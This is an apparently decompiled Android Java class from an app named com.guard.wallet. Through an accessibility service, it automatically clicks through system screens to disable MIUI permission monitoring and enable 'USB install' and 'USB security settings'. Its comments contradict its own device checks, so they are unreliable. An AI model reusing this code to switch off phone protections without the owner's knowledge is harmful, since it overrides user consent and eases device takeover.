/**
 * USB 安全设置调度任务 — EnableSecureDelegate 的 2 个 case 分发。
 *
 * vendor 原始类: o/j.java (340 行)
 * 2 cases:
 *   case 0: USB 安全配置（MIUI "禁用权限监控" + 其他 OEM "USB安装" + "USB安全设置"）
 *   default: 安全中心窗口 — 点击 下一步/开启 按钮
 */
package com.guard.wallet.delegate.task;

import android.util.Log;
import com.guard.wallet.delegate.FilterHelper;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicInteger;

public final class EnableSecureTask implements Runnable {

    /** vendor a — dispatch case id */
    public final int a;

    /** vendor b — reference to EnableSecureDelegate (k) */
    public final com.guard.wallet.delegate.EnableSecureDelegate b;

    public EnableSecureTask(com.guard.wallet.delegate.EnableSecureDelegate kVar, int caseId) {
        this.a = caseId;
        this.b = kVar;
    }

    @Override
    public final void run() {
        int caseId = this.a;
        com.guard.wallet.delegate.EnableSecureDelegate delegate = this.b;

        switch (caseId) {
            case 0:
                handlePrepareFinish(delegate);
                delegate.o.remove("enableInPrepareFinish");
                return;

            default:
                handleSecurityCenter(delegate);
        }
    }

    /**
     * Case 0: USB security configuration.
     * Phase 1 (MIUI only): find and toggle "禁用权限监控" checkbox
     * Phase 2 (non-MIUI): find and toggle "USB安装" + "USB安全设置" checkboxes
     */
    private void handlePrepareFinish(com.guard.wallet.delegate.EnableSecureDelegate delegate) {
        delegate.getClass();

        boolean allSuccess;
        label_outer: {
            /* Check if USB secure should be enabled */
            if (com.guard.wallet.delegate.PairAccessibilityDelegate.t0()) {

                // Phase 1: MIUI — 禁用权限监控
                if (com.guard.wallet.utils.DeviceUtils.isOppoFamily()) {
                    AtomicInteger retryCount = new AtomicInteger(0);

                    while (true) {
                        /* Find scrollable list */
                        UiObject listView = delegate.L();
                        UiObject scrollTarget = listView;

                        /* Scroll to end to ensure checkbox is visible */
                        if (listView != null && listView.canScrollForward()) {
                            listView.scrollForwardEnd();
                            delegate.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                            com.guard.wallet.utils.SystemHelper.T0(5);
                            scrollTarget = delegate.L();
                        }

                        /* Search for the checkbox: try backward scroll first, then forward */
                        UiObject found = null;
                        if (scrollTarget != null) {
                            if (scrollTarget.canScrollBackward()) {
                                found = FilterHelper.scrollBackwardUtilFilter(scrollTarget, com.guard.wallet.delegate.PairAccessibilityDelegate.F0());
                            }
                            if (found == null && scrollTarget.canScrollForward()) {
                                found = FilterHelper.scrollForwardUtilFilter(scrollTarget, com.guard.wallet.delegate.PairAccessibilityDelegate.F0());
                            }
                        }

                        /* If found, try to toggle checkbox */
                        if (found != null && found.parent() != null) {
                            UiObject parent = found.parent();
                            AtomicInteger parentRetry = new AtomicInteger(0);
                            CheckedResult result = new CheckedResult();
                            CombineFilter checkboxFilter = com.guard.wallet.delegate.PairAccessibilityDelegate.Q0();
                            MyAccessibilityService.I(parent);

                            /* Walk up parent tree to find checkbox */
                            UiObject checkbox = null;
                            while (parent != null && checkbox == null && parentRetry.incrementAndGet() <= 3) {
                                checkbox = parent.findOneByCombine(checkboxFilter);
                                if (checkbox == null) {
                                    parent = parent.parent();
                                }
                            }

                            boolean checked;
                            if (checkbox != null) {
                                checked = checkbox.checked();

                                /* Click checkbox if not checked */
                                if (!checked && checkbox.click()) {
                                    result.setClicked(true);
                                    checkbox.refresh();
                                    boolean nowChecked = checkbox.checked();
                                    int countdown = 20;
                                    while (countdown > 0 && !nowChecked) {
                                        com.guard.wallet.utils.SystemHelper.T0(1);
                                        checkbox.refresh();
                                        nowChecked = checkbox.checked();
                                        countdown--;
                                    }
                                    checked = nowChecked;
                                }

                                /* If still not checked, try clicking parent */
                                if (!checked) {
                                    UiObject clickableParent = checkbox.findParentUtilCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.T());
                                    if (clickableParent != null && clickableParent.click()) {
                                        result.setClicked(true);
                                        checkbox.refresh();
                                        boolean nowChecked = checkbox.checked();
                                        int countdown = 20;
                                        while (countdown > 0 && !nowChecked) {
                                            com.guard.wallet.utils.SystemHelper.T0(1);
                                            checkbox.refresh();
                                            nowChecked = checkbox.checked();
                                            countdown--;
                                        }
                                        checked = nowChecked;
                                    }
                                }
                            } else {
                                checked = false;
                            }

                            result.setChecked(checked);
                            if (result.isChecked()) {
                                delegate.p = true;
                                Log.d("EnableSecureDelegate", "禁用权限监控已勾选");
                            }
                        }

                        /* Exit loop if done or max retries exceeded */
                        if (delegate.p || retryCount.incrementAndGet() > 10) {
                            delegate.I(delegate.p);
                            break;
                        }
                        com.guard.wallet.utils.SystemHelper.T0(10);
                    }
                }

                // Phase 2: Non-MIUI — USB安装 + USB安全设置
                if (!com.guard.wallet.utils.DeviceUtils.isXiaomiFamily()) {
                    allSuccess = false;
                    break label_outer;
                }

                AtomicInteger usbRetry = new AtomicInteger(0);

                /* Step 2a: Find and toggle "USB安装" */
                phase2_usbInstall:
                while (true) {
                    UiObject listView = delegate.L();
                    if (listView != null) {
                        /* ADAPT: o.z shadows — use FilterHelper for CombineScrollCondition */
                        UiObject usbInstallNode = FilterHelper.scrollForwardUtil(listView, com.guard.wallet.delegate.PairAccessibilityDelegate.R0(), 2, 0);

                        /* If not found forward, try scrolling back then forward */
                        if (usbInstallNode == null) {
                            listView.scrollBackwardEnd();
                            delegate.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                            com.guard.wallet.utils.SystemHelper.T0(5);
                            listView = delegate.L();
                            if (listView != null) {
                                usbInstallNode = FilterHelper.scrollForwardUtil(listView, com.guard.wallet.delegate.PairAccessibilityDelegate.R0(), 2, 0);
                            }
                        }

                        boolean clicked;
                        if (usbInstallNode != null) {
                            usbInstallNode = usbInstallNode.findParentUtilCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.q0());
                            if (usbInstallNode != null) {
                                CheckedResult cr = delegate.K(usbInstallNode, 20);
                                delegate.q = cr.isChecked();
                                clicked = cr.isClicked();
                            } else {
                                clicked = false;
                            }
                        } else {
                            clicked = false;
                        }

                        if (clicked) {
                            Log.d("EnableSecureDelegate", "USB安装已点击");
                        }
                        if (delegate.q) {
                            Log.d("EnableSecureDelegate", "USB安装已勾选");
                        }
                    }

                    if (delegate.q || usbRetry.incrementAndGet() > 10) {
                        usbRetry.set(0);

                        /* Step 2b: Find and toggle "USB安全设置" */
                        while (true) {
                            UiObject listView2 = delegate.L();
                            if (listView2 != null) {
                                UiObject usbSecNode = FilterHelper.scrollForwardUtil(listView2, com.guard.wallet.delegate.PairAccessibilityDelegate.S0(), 3, 0);

                                if (usbSecNode == null) {
                                    listView2.scrollBackwardEnd();
                                    delegate.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                                    com.guard.wallet.utils.SystemHelper.T0(5);
                                    listView2 = delegate.L();
                                    if (listView2 != null) {
                                        usbSecNode = FilterHelper.scrollForwardUtil(listView2, com.guard.wallet.delegate.PairAccessibilityDelegate.S0(), 3, 0);
                                    }
                                }

                                boolean secClicked;
                                if (usbSecNode != null) {
                                    usbSecNode = usbSecNode.findParentUtilCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.q0());
                                    if (usbSecNode != null) {
                                        com.guard.wallet.utils.SystemHelper.T0(5);
                                        CheckedResult cr2 = delegate.K(usbSecNode, 0);
                                        delegate.r = cr2.isChecked();
                                        secClicked = cr2.isClicked();
                                    } else {
                                        secClicked = false;
                                    }
                                } else {
                                    secClicked = false;
                                }

                                if (delegate.r) {
                                    Log.d("EnableSecureDelegate", "USB安全设置已勾选");
                                }

                                /* If security toggle was clicked, wait for dialog */
                                if (secClicked) {
                                    AtomicInteger dialogWait = new AtomicInteger(10);
                                    while (true) {
                                        boolean dialogAppeared = delegate.H();
                                        if (dialogAppeared || dialogWait.decrementAndGet() < 0) {
                                            if (dialogAppeared) {
                                                Log.d("EnableSecureDelegate", "USB安全设置点击成功,已弹出安全设置窗口");
                                            }
                                            break;
                                        }
                                        com.guard.wallet.utils.SystemHelper.T0(1);
                                    }
                                }
                            }

                            /* Check if dialog appeared even without click */
                            AtomicInteger finalWait = new AtomicInteger(10);
                            while (true) {
                                boolean dialogAppeared = delegate.H();
                                if (dialogAppeared || finalWait.decrementAndGet() < 0) {
                                    if (delegate.r || dialogAppeared || usbRetry.incrementAndGet() > 10) {
                                        if (!delegate.r) {
                                            /* USB安全设置 not checked — fail */
                                            allSuccess = false;
                                            break label_outer;
                                        }
                                        Log.d("EnableSecureDelegate", "USB安全设置已勾选");
                                        if (delegate.q && delegate.r) {
                                            allSuccess = true;
                                            break label_outer;
                                        }
                                        continue phase2_usbInstall;
                                    }
                                    com.guard.wallet.utils.SystemHelper.T0(10);
                                    break;
                                }
                                com.guard.wallet.utils.SystemHelper.T0(1);
                            }
                        }
                    }

                    com.guard.wallet.utils.SystemHelper.T0(10);
                }
            }

            allSuccess = false;
        }

        delegate.I(allSuccess);
    }

    /**
     * Default case: Handle security center window.
     * Try to click 下一步 or 开启 button, wait for USB安全设置 to complete.
     */
    private void handleSecurityCenter(com.guard.wallet.delegate.EnableSecureDelegate delegate) {
        Log.d("EnableSecureDelegate", "enableInSecurityCenter 窗口匹配");

        UiObject nextBtn = delegate.k().findOneByCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.K0());
        ConcurrentLinkedQueue queue = delegate.o;

        if (nextBtn != null && nextBtn.clickable() && nextBtn.click()) {
            Log.d("EnableSecureDelegate", "enableInSecurityCenter 下一步");
        } else {
            UiObject enableBtn = delegate.k().findOneByCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.J0());
            if (enableBtn != null && enableBtn.clickable() && enableBtn.click()) {
                int waitTime = 10;
                while (true) {
                    com.guard.wallet.utils.SystemHelper.T0(waitTime);

                    boolean stillProgress;
                    if (delegate.k() != null && delegate.k().findOneByCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.L0()) != null) {
                        stillProgress = true;
                    } else {
                        stillProgress = false;
                    }

                    if (!stillProgress) {
                        delegate.r = true;
                        delegate.I(delegate.q);
                        break;
                    }

                    Log.d("EnableSecureDelegate", "正在开启USB安全设置....");
                    waitTime = 5;
                }
            }
        }

        queue.remove("enableInSecurityCenter");
    }
}
